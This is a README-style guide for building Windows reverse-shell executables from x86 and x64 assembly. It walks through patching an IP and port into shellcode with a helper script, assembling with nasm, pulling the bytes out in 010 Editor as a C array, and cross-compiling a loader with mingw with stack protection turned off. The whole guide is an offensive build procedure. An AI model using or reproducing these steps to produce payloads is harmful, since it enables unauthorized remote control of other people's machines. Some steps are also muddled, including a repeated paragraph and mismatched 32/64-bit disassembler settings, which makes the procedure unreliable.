# Dreg Shells Guide

## Dependecies

```bash
apt-get install gcc mingw-w64 nasm -y
```

## Apps used

- [010 Editor](https://www.sweetscape.com/010editor/)

## Reverse shell Assembly x86
---

Firts you will need to change the ip and the port in the shellcode, to do this you will be using the [genipport.sh](/genipport.sh).

In the ip line (line 24) and the port line (line 25) with your ip and your port. Then execute the script and the output it's going to be like the following: 
```bash
root {debian} $ ./genipport.sh
ip: 127.0.0.1
port: 4444
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
syslinux-utils is already the newest version (3:6.04~git20190206.bf6db5b4+dfsg1-3+b1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
converting IP....
converting: 7F000001
endian: 0100007F
IP converted: FEFFFF80
converting PORT....
converting: 115C
endian: 5C11
port converted: A3EE
```

You will be geting the "IP converted" and the "port converted" output and and you will have to put it with a 0x each of the outputs in the following lines of the shellcode.

```assembly
push dword 0x77D23CCC ; line 223 
push word 0xA3EE ; line 225
```
And making the changes, this is how the two lines "with my output" would look like.
```assembly
push dword 0xFEFFFF80 ; line 223 
push word 0xA3EE ; line 225
```
The next thing we will do is compile the assembler file to an object file with the following command:
```bash
nasm -f win32 reverse_asm.asm -o reverse_shell.o
```
After compiling to an object file we will use the 010 editor and add the file to the editor we will look where the shellcode begins. How?

![Alt text](/images/v8YjDpT.png)

Here to know where it starts we will select a part and look for the beginning of the program before compiling.

```assembly
pushfd
```

To know if it agrees we will click on the tools section and then to dissembler

To know if it agrees we will click on the tools section and then dissembler. Then we will choose the section of X86(64-Bit) and click dissamble.

![Alt text](/images/BWJenLL.png)

And this panel will appear, and we will look in Value for the string that we mentioned before "pushfd".

![Alt text](/images/fCEEq3q.png)

From then on we can select everything since there will be no problem. When we have everything selected we will copy it as C code.

![Alt text](/images/mTFErYK.png)

When we have it copied, we will change the shellcode of the "reverse_c.c" file for the one we have in the clipboard including the function name throughout the code.

Then we will compile to an exe file with the following command and our reverse shell will be ready.

```bash
i686-w64-mingw32-gcc -fno-stack-protector -o test.exe test.c
```

---
## Reverse shell Assembly x64

Firts you will need to change the ip and the port in the shellcode, to do this you will be using the [genipport.sh](/genipport.sh).

In the ip line (line 24) and the port line (line 25) with your ip and your port. Then execute the script and the output it's going to be like the following: 
```bash
root {debian} $ ./genipport.sh
ip: 127.0.0.1
port: 4444
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
syslinux-utils is already the newest version (3:6.04~git20190206.bf6db5b4+dfsg1-3+b1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
converting IP....
converting: 7F000001
endian: 0100007F
IP converted: FEFFFF80
converting PORT....
converting: 115C
endian: 5C11
port converted: A3EE
```

You will be geting the "IP converted" and the "port converted" output and and you will have to put it with a 0x each of the outputs in the following lines of the shellcode.

```assembly
push dword 0x77D23CCC ; line 244
push word 0xA3EE ; line 248
```
And making the changes, this is how the two lines "with my output" would look like.
```assembly
push dword 0xFEFFFF80 ; line 244
push word 0xA3EE ; line 248
```
The next thing we will do is compile the assembler file to an object file with the following command:
```bash
nasm -f win64 reverse_asm.asm -o reverse_shell.o
```
After compiling to an object file we will use the 010 editor and add the file to the editor we will look where the shellcode begins. How?

![Alt text](/images/v8YjDpT.png)

Here to know where it starts we will select a part and look for the beginning of the program before compiling.

Here to know where it starts we will select a part and look for the beginning of the program before compiling.

```assembly
sub rsp, 0x30
```

To know if it agrees we will click on the tools section and then dissembler. Then we will choose the section of X86(32-Bit) and click dissamble.

![Alt text](/images/hTAv7CY.png)

And this panel will appear, and we will look in Value for the string that we mentioned before "sub rsp, 0x30".

![Alt text](/images/fCEEq3q.png)

From then on we can select everything since there will be no problem. When we have everything selected we will copy it as C code.

![Alt text](/images/mTFErYK.png)

When we have it copied, we will change the shellcode of the "reverse_c64.c" file for the one we have in the clipboard including the function name throughout the code.

Then we will compile to an exe file with the following command and our reverse shell will be ready.

```bash
x86_64-w64-mingw32-gcc -fno-stack-protector -o test.exe test.c
```